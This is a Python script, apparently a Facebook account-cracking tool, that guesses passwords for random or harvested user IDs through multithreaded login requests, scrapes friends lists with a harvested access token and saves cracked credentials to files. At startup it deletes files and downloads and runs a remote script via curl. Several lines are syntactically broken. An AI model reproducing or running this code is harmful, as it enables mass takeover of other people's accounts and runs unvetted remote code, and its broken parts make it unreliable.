#coding=utf
import os,sys,time,json,random,re,string,platform,base64
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup
header_grup = {"user-agent": "Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 Edge/40.15254.603
"}
logo="""
\t##     ##   ######    ######## 
\t##     ##  ##    ##     ##    
\t##     ##  ##           ##    
\t#########   ######      ##    
\t##     ##        ##     ##    
\t##     ##  ##    ##     ##    
\t##     ##   ######      ##    
--------------------------------------------------
Author: Muhammad Hamza
Github: https://github.com/Hamzahash
Version: 3.0
--------------------------------------------------
device-based Log
--------------------------------------------------"""
loop = 0
oks = []
cps = []
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    proxy = requests.get('https://raw.githubusercontent.com/Hamzahash/assests/main/update_ua.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/Hamzahash/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf h*')
        os.system('curl -L https://raw.githubusercontent.com/Hamzahash/hop/main/hop.py > hop.py')
        os.system('python hop.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
def buy():
    os.system('clear')
    print(logo)
    print('\033[1;33mChecking subscription ....\033[0;97m')
    try:
        user_data = requests.get('https://raw.githubusercontent.com/hsbuy/hsbuy/main/tokens.txt').text.splitlines()
        t1 = base64.b64encode(str(os.getuid()).encode('ascii'))
        t2 = base64.b64encode((str(platform.uname()[2])).encode('ascii'))
        gen_token=('QW4HDDQCRG-'+str(t1)+'-AZMAH-'+str(t2))
        if gen_token in user_data:
            main()
        else:
            print('\nYour token: '+gen_token)
            print('\n\n You donot have hst subscription.')
            print('Neechy diye easypaisa account par RS 400 send kry.')
            print('Payment karny k bad payment ka screenshot or apna token neechy diye whatsapp number pr send kry')
            print(50*'-')
            print('[Payment Number]')
            print('Account number: 0321-5822365')
            print('Account name: Muhammad Hamza')
            print('Account type: Easypaisa')
            print(50*'-')
            print('[Whatsapp Number]')
            print('Number: 0321-5822365')
            print(50*'-')
            input('Press enter to contact on whatsapp')
            os.system('xdg-open https://wa.me/+923215822365')
    except Exception as e:
        #print(e)
        print('\n\033[1;31mNo internet connection ... \033[0;97m')
def main():
    os.system('clear')
    print(logo)
    print('[1] Random crack')
    print('[2] File crack')
    print('[3] Create file')
    print('[4] Separate ids from file')
    print('[5] Login another account')
    print('[6] Remove dublicate lines')
    print('[7] Join chat groups')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_crack()
    elif opt =='2':
        file_crack()
    elif opt =='3':
        create_file()
    elif opt =='4':
        sids()
    elif opt =='5':
        os.system('rm -rf .fb_*.txt')
        login()
    elif opt =='6':
        remove_dub()
    elif opt =='7':
        os.system('xdg-open https://chat.whatsapp.com/BbseVKFwPpxCmL8iNz1k2U')
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('[1] Random UID crack')
    print('[2] Random number crack')
    print('[B] Back')
    print(50*'-')
    opt = input('Choose option >>> ')
    if opt =='1':
        random_uid()
    elif opt =='2':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
def random_uid():
    user=[]
    os.system('clear')
    print(logo)
    limit = int(input('How many ids do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append('1000'+nmp)
    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
    pwx = input('Put passwords: ').split(',')
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for uid in user:
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')
def random_number():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;33mCode example: 92301,92302,92305,92306 ...\033[0;97m')
    kode = input('Put code: ')
    limit = int(input('How many numbers do you want to add ? '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('Total ids: '+tl)
        print('The process has been started')
        print(50*'-')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'-')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print(50*'-')
def create_file():
    ids=[]
    os.system('clear')
    try:
        email = open('.fb_email.txt', 'r').read()
        pas = open('.fb_pas.txt','r').read()
    except FileNotFoundError:
        login()
    print(logo)
    dynamic('Generating session for you ')
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.open('https://m.facebook.com/')
    br._factory.is_html = True
    br.select_form(nr=0)
    br.form['email'] = str(email)
    br.form['pass'] = str(pas)
    br.submit()
    url = br.geturl()
    #print(url)
    if 'save-device' in url or 'zero/policy/optin' in url:
        business=br.open('https://business.facebook.com/business_locations')
        business_read = business.read()
        access_token = re.search("(EAAG\w+)", str(business_read)).group(1)
    elif 'checkpoint' in url:
        print('\n\033[1;31mLogged account is enrolled in checkpoint, try logging another account\033[0;97m')
        os.system('rm -rf fb*.txt')
        os.sys.exit()
    else:
        print('\n\033[1;31mFB email/password is wrong, try another account with correct credentials\033[0;97m')
        os.system('rm -rf fb*.txt')
        os.sys.exit()
    try:
        br.addheaders=[('content-type','application/x-www-form-urlencoded'),('accept-encoding','utf-8')]
        q = br.open('https://graph.facebook.com/me?fields=id,name&access_token='+access_token)
        data = json.loads(q.read())
        iid = data['id']
    except KeyError:
        print('\n\033[1;31mInvalid requests, try on another account\033[0;97m')
        os.system('rm -rf fb*.txt')
        os.sys.exit()
    os.system('clear')
    print(logo)
    limit = int(input('How many ids do you want to add? '))
    print('\033[1;33mExample: /sdcard/filename.txt\033[0;97m')
    sf = input('Save file as: ')
    print(50*'-')
    t = 0
    for _ in range(limit):
        t +=1
        idt = input('Put id no %s: '%t)
        q = br.open('https://graph.facebook.com/'+idt+'?fields=friends.fields(id,name)&access_token='+access_token)
        data = json.loads(q.read())
        for i in data['friends']['data']:
            iids = i['id']
            names = i['name']
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = 'Ali'
            open(sf,'a').write(iids+'|'+fn+'|'+ln+'\n')
    print(50*'-')
    print('File saved as: '+sf)
    input('Press enter to back ')
    main()
def file_crack():
    os.system('clear')
    print(logo)
    file = input('Put file path: ')
    try:
        fileopen = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print('\033[1;91mFile not found on provided path, try again ....\033[0;97m')
        time.sleep(1)
        file_crack()
    print(50*'-')
    print('[1] Firstname digits passwords')
    print('[2] First&last name passwords')
    print('[3] Firstlast name digitsnames')
    print('[4] Choice passwords')
    print(50*'-')
    gaddari = input('Choose passlist: ')
    if gaddari =='1':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            tl=str(len(fileopen))
            print('Total ids: '+tl)
            print('Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                    #public_ids.append(uid)
                except ValueError:
                    print('\nThis file is not supported for HOP tool.Create file only from HOP tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
                pwx=[ps+'12',ps+'1234',ps+'1122',ps+'786',first+'123',first+'12345']
                yaari.submit(method1,uid,pwx,tl)
        print(50*'-')
        print('Crack process has been completed')
        print('Ids saved in ok.txt,cp.txt')
        print(50*'-')
    elif gaddari =='2':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            tl=str(len(fileopen))
            print('Total ids: '+tl)
            print('Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                    #public_ids.append(uid)
                except ValueError:
                    print('\nThis file is not supported for HOP tool.Create file only from HOP tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
                pwx=[ps+' '+ps2,ps+ps2]
                yaari.submit(method1,uid,pwx,tl)
        print(50*'-')
        print('Crack process has been completed')
        print('Ids saved in ok.txt,cp.txt')
        print(50*'-')
    elif gaddari =='3':
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            tl=str(len(fileopen))
            print('Total ids: '+tl)
            print('Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                    #public_ids.append(uid)
                except ValueError:
                    print('\nThis file is not supported for HOP tool.Create file only from HOP tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
                pwx=[ps+ps2+'123',ps+ps2+'1234',ps+ps2+'12345',ps+ps2+'786',ps+ps2+'1122',ps+ps2+'12']
                yaari.submit(method1,uid,pwx,tl)
        print(50*'-')
        print('Crack process has been completed')
        print('Ids saved in ok.txt,cp.txt')
        print(50*'-')
    elif gaddari =='4':
        print(50*'-')
        print('\033[1;33mPassword example: 667788,334455,99900,khan khan,khankhan etc\033[0;97m')
        print(50*'-')
        pwx = input('Put passwords: ').split(',')
        with ThreadPool(max_workers=30) as yaari:
            os.system('clear')
            print(logo)
            tl=str(len(fileopen))
            print('Total ids: '+tl)
            print('Brute Has been started')
            print(50*'-')
            for user in fileopen:
                try:
                    uid,first,last = user.split('|')
                    #public_ids.append(uid)
                except ValueError:
                    print('\n This file is not supported for HOP tool.Create file only from HOP tool....\n')
                    os.sys.exit()
                yaari.submit(method1,uid,pwx,tl)
        print(50*'-')
        print('Crack process has been completed')
        print('Ids saved in ok.txt,cp.txt')
        print(50*'-')
    else:
        print('Choose valid passlist, try again ...')
        time.sleep(1)
        main()
def login():
    os.system('clear')
    print(logo)
    print('\033[1;33mPut your email & pass to login\033[0;97m\n')
    email = input('Email/id/number: ')
    passw = input('Password: ')
    open('.fb_email.txt', 'w').write(email)
    open('.fb_pas.txt', 'w').write(passw)
    print('\033[1;32mLogged in successfully\033[0;97m\n')
    os.sys.exit()
def sids():
    os.system('clear')
    print(logo)
    file_name = input('Input file name: ')
    limit = int(input('How many links do you want to separate? '))
    print('\n\033[1;33mExample: /sdcard/filename.txt\033[0;97m')
    new_save = input('Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input('Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> /sdcard/'+new_save)
    print(50*'-')
    print('Links grabbed successfully')
    print('Total grabbed links: '+str(len(open('/sdcard/'+new_save).read().splitlines())))
    print('New file saved as: /sdcard/'+new_save)
    print(50*'-')
    input('Press enter to back ')
def remove_dub():
    os.system('clear')
    print(logo)
    print('Dublicate lines remover ...')
    print(50*'-')
    user_file = input('Put file path: ')
    try:
        open(user_file,'r').read()
        print('\n\033[1;33mExample: /sdcard/filename.txt\033[0;97m')
        save_file = input('Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(50*'-')
        print('Dublicate lines has been removed from file')
        print('Result file saved as: ')
        print(50*'-')
    except FileNotFoundError:
        print('\n\033[1;31m  File not found on provided path, try again ...\033[0;97m')
'''
Here all crack methods are defined








'''
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(proxy)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'m.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            {"user-agent": "Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 Edge/40.15254.603
"}}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[QADIR-OK] '+cid+' | '+ps+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[QADIR-CP] '+cid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r   [%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
def method1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(proxy)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'m.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            '{"user-agent": "Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 Edge/40.15254.603
"}}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32m[QADIR-OK] '+cid+' | '+ps+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;31m[QADIR-CP] '+cid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r   [%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
main()
